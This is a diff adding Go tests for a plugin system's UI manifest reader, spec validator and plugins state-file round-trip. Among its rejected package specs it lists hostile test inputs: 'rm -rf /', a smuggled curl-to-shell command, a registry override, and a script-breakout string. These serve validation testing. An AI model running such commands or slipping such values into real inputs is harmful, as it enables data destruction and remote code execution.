@@ -92,3 +92,66 @@ func TestWritePluginResolversEmptySetGeneratesStub(t *testing.T) {
 		t.Errorf("empty-set write with no prior file: %v", err)
 	}
 }
+
+// A plugin's UI manifest is read when present, refused when malformed, and its packages survive the module's re-add
+func TestUIManifest(t *testing.T) {
+	none := t.TempDir()
+	if ui, err := ReadUI(none); err != nil || ui != (UI{}) {
+		t.Fatalf("no manifest: %+v, %v", ui, err)
+	}
+	dir := writeTree(t, map[string]string{UIManifest: `{"dashboard": "@acme/fraud-dashboard@^1.2.0", "storefront": "acme-fraud-shop"}`})
+	ui, err := ReadUI(dir)
+	if err != nil || ui.Dashboard != "@acme/fraud-dashboard@^1.2.0" || ui.Storefront != "acme-fraud-shop" {
+		t.Fatalf("manifest: %+v, %v", ui, err)
+	}
+	for _, spec := range []string{
+		"rm -rf /", "zod@npm:evil-pkg", "x@https://example.test/x.tgz", "x@github:u/r", "x@file:../..",
+		"x@1;curl${IFS}example.test|sh", "--config.registry=https://example.test", "x@1\u001b[2J", "X", "x@", "@acme/",
+	} {
+		bad := writeTree(t, map[string]string{UIManifest: `{"dashboard": "` + spec + `"}`})
+		if _, err := ReadUI(bad); err == nil {
+			t.Errorf("the package spec %q was taken", spec)
+		}
+	}
+	for _, spec := range []string{"x", "@acme/x", "x@1.2.3", "x@^1.2.0", "x@~1.2", "x@1.x", "x@latest", "x@1.0.0-beta.1+build.5"} {
+		if !ValidPackageSpec(spec) {
+			t.Errorf("the package spec %q was refused", spec)
+		}
+	}
+	typo := writeTree(t, map[string]string{UIManifest: `{"dashbord": "@acme/x"}`})
+	if _, err := ReadUI(typo); err == nil {
+		t.Error("a misspelt key read as a plugin with no UI")
+	}
+	edited := writeTree(t, map[string]string{StateFile: `{"plugins": {"fraud": {"enabled": true, "dashboard": "x';alert(1)//"}}}`})
+	if _, err := Load(edited); err == nil {
+		t.Error("a hand-edited spec that would break out of the generated import was loaded")
+	}
+
+	set := &Set{}
+	set.SetModule("fraud", "github.com/acme/fraud")
+	set.SetUI("fraud", ui)
+	set.SetModule("fraud", "github.com/acme/fraud")
+	set.Set("fraud", false)
+	if e := set.Plugins["fraud"]; e.Dashboard != ui.Dashboard || e.Storefront != ui.Storefront || e.Enabled {
+		t.Errorf("entry %+v - the UI packages went missing on a later write", e)
+	}
+}
+
+// The CLI's own copy of this file's reader and writer is held to the same fixture, so neither drops what the other wrote
+func TestPluginsFileRoundTrips(t *testing.T) {
+	want, err := os.ReadFile("testdata/plugins.roundtrip.json")
+	if err != nil {
+		t.Fatal(err)
+	}
+	root := writeTree(t, map[string]string{StateFile: string(want)})
+	set, err := Load(root)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := set.Save(root); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ := os.ReadFile(filepath.Join(root, StateFile)); string(got) != string(want) {
+		t.Errorf("a load and save rewrote the file:\n%s", got)
+	}
+}
